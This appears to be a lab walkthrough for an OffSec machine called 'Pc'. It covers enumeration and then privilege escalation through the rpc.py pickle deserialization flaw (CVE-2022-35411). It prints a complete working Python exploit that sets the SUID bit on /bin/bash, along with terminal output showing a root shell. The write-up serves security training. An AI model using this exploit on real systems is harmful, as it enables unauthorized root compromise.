____

# Walkthrough for Pc

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine. At port 8000

Visiting the web server, we see the **tty** terminal with the very low-privileged user "**user**".

## Enumeration

We start with the enumeration.

We find an interesting file under `/opt` directory, `rpc.py`

This file seems like is using the RPC protocol that sets up an RPC server.

It looks like it would have run at port 65432,

```python
if __name__ == "__main__":
    uvicorn.run(app, interface="asgi3", port=65432)
```

Looking at network connections we notice that the RPC server is actually running,

Under, `/etc/supervisor/conf.d` directory,

We notice 2 files `rpc.conf` and `ttyd.conf`.

Now that we have a better understanding about the services and the configurations let's dive into exploitation.

# Privilege Escalation

`RPC` is a class from the `rpcpy` library that allows you to define remote procedure calls that can be accessed by clients over a network.

Find more details about it from here: [rpc.py · PyPI](https://pypi.org/project/rpc.py/)

## rpcpy

> An fast and powerful RPC framework based on ASGI/WSGI

Searching **"python rpcpy exploit"** on google will lead us [here](https://security.snyk.io/vuln/SNYK-PYTHON-RPCPY-2946719).

![](https://portal.offsec.com/labs/images/snyk.png)

The detail exploitation steps can be found here: https://www.exploit-db.com/exploits/50983

We find that "**[2022-35411](https://nvd.nist.gov/vuln/detail/CVE-2022-35411)"** has been recorded for **rpc.py**.

Using the exploit below we can elevate our privileges,

```python
import requests
import pickle

HOST = "127.0.0.1:65432"
URL = f"http://{HOST}/sayhi"
HEADERS ={
    "serializer": "pickle"
}

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    payload = pickle.dumps(PickleRce())
    print(payload)
    return payload

def exec_command(cmd):
    payload = generate_payload(cmd)
    requests.post(url=URL, data=payload, headers=HEADERS)

def main():
    exec_command('id;chmod u+s /bin/bash')

if __name__ == "__main__":
	main()
```

```python
user@pc:/home/user$ python3 expl.py 
b'x80x04x951x00x00x00x00x00x00x00x8cx05posixx94x8cx06systemx94x93x94x8cx16id;chmod u+s /bin/bashx94x85x94Rx94.'
user@pc:/home/user$ ls -alh /bin/bash
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /bin/bash
user@pc:/home/user$ /bin/bash -p -i 
bash-5.0# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
bash-5.0# 
```
